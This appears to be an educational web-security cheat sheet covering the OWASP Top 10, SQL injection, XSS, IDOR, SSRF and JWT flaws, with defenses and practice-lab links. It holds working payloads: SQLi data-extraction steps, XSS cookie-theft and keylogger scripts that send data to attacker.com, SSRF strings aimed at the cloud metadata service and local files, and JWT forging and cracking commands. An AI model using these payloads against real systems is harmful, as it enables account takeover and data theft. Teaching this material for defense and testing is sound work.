# Web Security

> The web was built for document sharing. Everything layered on top — sessions, authentication, APIs, dynamic content — is retrofitted. The retrofits are where the cracks are.

---

## OWASP Top 10 — 2021

| Rank | Vulnerability | One-Line Explanation |
| :--- | :--- | :--- |
| A01 | Broken Access Control | Users can do things they shouldn't be allowed to do |
| A02 | Cryptographic Failures | Sensitive data exposed due to weak or missing encryption |
| A03 | Injection | Untrusted data sent to an interpreter (SQL, OS, LDAP) |
| A04 | Insecure Design | Architectural flaws that no patch can fix |
| A05 | Security Misconfiguration | Default settings, exposed admin panels, verbose errors |
| A06 | Vulnerable Components | Using libraries/frameworks with known CVEs |
| A07 | Auth Failures | Broken login, weak passwords, exposed sessions |
| A08 | Software/Data Integrity Failures | Unsigned updates, insecure deserialization |
| A09 | Logging & Monitoring Failures | No detection capability |
| A10 | SSRF | Server makes requests to internal resources on attacker's behalf |

---

## SQL Injection (SQLi)

**Why it works:** Applications build SQL queries by concatenating user input. Attackers inject SQL syntax to manipulate the query.

```python
# Vulnerable code
query = "SELECT * FROM users WHERE username='" + username + "'"
# Input: admin' OR '1'='1
# Result: SELECT * FROM users WHERE username='admin' OR '1'='1'
# '1'='1' is always true → returns all users

# Vulnerable code with login
query = f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
# Username: admin'--
# Result: SELECT * FROM users WHERE username='admin'--' AND password='...'
# -- comments out the rest → bypasses password check
```

### SQLi Types

| Type | Characteristics | Detection |
| :--- | :--- | :--- |
| **In-band (Error-based)** | Errors reveal DB info | Trigger SQL error, read it |
| **In-band (Union-based)** | Use UNION to extract data | `UNION SELECT NULL,NULL--` |
| **Blind (Boolean-based)** | No output, but behavior changes | Response differs on true/false |
| **Blind (Time-based)** | No output, use sleep() | `' AND SLEEP(5)--` takes 5s |
| **Out-of-band** | Data via DNS/HTTP | `LOAD_FILE`, `INTO OUTFILE` |

### Manual SQLi Testing

```sql
-- Step 1: Break the query
'
''
`
')
'))

-- Step 2: Comment out rest (MySQL)
--
-- -
#
/**/

-- Step 3: Determine column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error here means 2 columns

-- Step 4: Find displayable columns
' UNION SELECT NULL,'a'--
' UNION SELECT 'a',NULL--

-- Step 5: Extract data
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
```

### Defense

```python
# Use parameterized queries (prepared statements) — ALWAYS
# Python + SQLite
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))

# Python + psycopg2 (PostgreSQL)
cursor.execute("SELECT * FROM users WHERE username=%s AND password=%s", (username, password))
```

**Practice:** [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection) — 18 free labs from basics to blind.

---

## Cross-Site Scripting (XSS)

**Why it works:** Applications render user input as HTML without sanitizing it. Injected JavaScript runs in other users' browsers.

### XSS Types

**Reflected XSS:** Payload is in the URL, reflected once in the response.

```
https://target.com/search?q=<script>alert(1)</script>
```

**Stored XSS:** Payload is saved in the database and served to all users who view it.

```html
<!-- In a comment field: -->
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

**DOM-based XSS:** Payload is handled by client-side JavaScript, never reaches the server.

```javascript
// Vulnerable code:
document.getElementById('output').innerHTML = location.hash.slice(1);
// URL: https://target.com/#<img src=x onerror=alert(1)>
```

### XSS Payloads

```html
<!-- Basic proof of concept -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Cookie theft -->
<script>fetch('https://attacker.com/?c='+btoa(document.cookie))</script>

<!-- Keylogger -->
<script>
document.addEventListener('keypress', function(e){
    fetch('https://attacker.com/?k='+e.key)
})
</script>

<!-- Filter bypasses -->
<ScRiPt>alert(1)</ScRiPt>          <!-- Case variation -->
<script>alert`1`</script>           <!-- Template literal -->
"><img src=x onerror=alert(1)>      <!-- Break attribute context -->
javascript:alert(1)                 <!-- href injection -->
```

### Defense

```python
# Output encoding — escape before rendering
import html
safe = html.escape(user_input)

# In Jinja2: use {{ var }} not {{ var | safe }}
# Content-Security-Policy header:
Content-Security-Policy: default-src 'self'; script-src 'self'
# This blocks inline scripts and external script sources
```

---

## Broken Access Control / IDOR

**Why it works:** Applications verify authentication (is the user logged in?) but not authorization (is this user allowed to do *this*?).

IDOR = Insecure Direct Object Reference — when you can access objects belonging to other users by changing an ID.

```
# You are user 1234
GET /api/user/1234/profile → your data
GET /api/user/1235/profile → someone else's data ← IDOR if this works

# Horizontal privilege escalation: access other users at same level
# Vertical privilege escalation: access admin functions as regular user
GET /api/admin/users → 403 normally
# What if: add header X-Original-URL: /admin
# Or: /api/Admin/users (case sensitivity)
# Or: /api/users/../admin/users (path traversal)
```

### Testing Access Control

```bash
# Log the full request as User A, then replay as User B (or unauthenticated)
# Tools: Burp Suite's "Match and Replace" to swap session tokens

# Common bypass techniques:
# Change request method: POST → GET
# Change Content-Type header
# Add headers: X-Forwarded-For, X-Original-URL, X-Rewrite-URL
# UUID vs sequential IDs — UUIDs are harder to enumerate
```

---

## Server-Side Request Forgery (SSRF)

**Why it works:** The server fetches a URL provided by the user. Attackers make the server request internal resources.

```python
# Vulnerable code
url = request.get('url')
response = requests.get(url)   # Server fetches this, not the browser

# Attack: make the server request internal infrastructure
url = http://169.254.169.254/latest/meta-data/  # AWS metadata service
url = http://localhost:6379/    # Internal Redis
url = http://internal-admin.company.local/
url = file:///etc/passwd        # Read local files
```

### SSRF Bypass Techniques

```
http://127.0.0.1/admin
http://0.0.0.0/admin
http://[::1]/admin           ← IPv6 loopback
http://127.1/admin           ← Abbreviated
http://2130706433/admin      ← Decimal IP for 127.0.0.1
http://017700000001/admin    ← Octal IP
```

---

## Authentication Vulnerabilities

### Password Reset Flaws

Common patterns to test:

1. **Host header injection in reset email:** Change `Host:` header to `attacker.com` — if the reset link uses the Host header, the link goes to attacker.com
2. **Reset token in referer:** After clicking the link, does it appear in the Referer header to third-party resources?
3. **Weak tokens:** Predictable tokens (timestamp-based, username-derived)
4. **Token not invalidated after use:** Can you reuse a consumed reset link?

### JWT Attacks

```python
# JWT = Header.Payload.Signature (base64url encoded, dot-separated)
# Common flaws:

# 1. Algorithm confusion (alg: none)
# Change algorithm to "none", remove signature → some servers accept it
import jwt
token = jwt.encode(payload, '', algorithm='none')

# 2. RS256 → HS256 confusion
# If server uses public key to verify HS256, sign with the public key

# 3. Weak secret (can be cracked)
# hashcat -a 0 -m 16500 token.txt wordlist.txt
```

**Practice:** [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt)

---

## Tools Reference

```bash
# Web application fingerprinting
whatweb target.com
wappalyzer (browser extension)
nmap -sV --script http-headers target.com

# Directory enumeration
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403

# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com
gobuster dns -d target.com -w subdomains.txt

# Vulnerability scanning
nikto -h https://target.com
nuclei -u https://target.com

# Parameter fuzzing
ffuf -u 'https://target.com/api?FUZZ=value' -w params.txt
```

## Resources

| Resource | Type | Cost |
| :--- | :--- | :--- |
| [PortSwigger Web Security Academy](https://portswigger.net/web-security) | Labs + theory | Free |
| [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/) | Reference | Free |
| [HackTricks Web](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html) | Techniques | Free |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Payload reference | Free |
| [Bug Bounty Bootcamp](https://nostarch.com/bug-bounty-bootcamp) | Book | Paid |
| [The Web Application Hacker's Handbook](https://portswigger.net/web-security/web-application-hackers-handbook) | Book | Paid |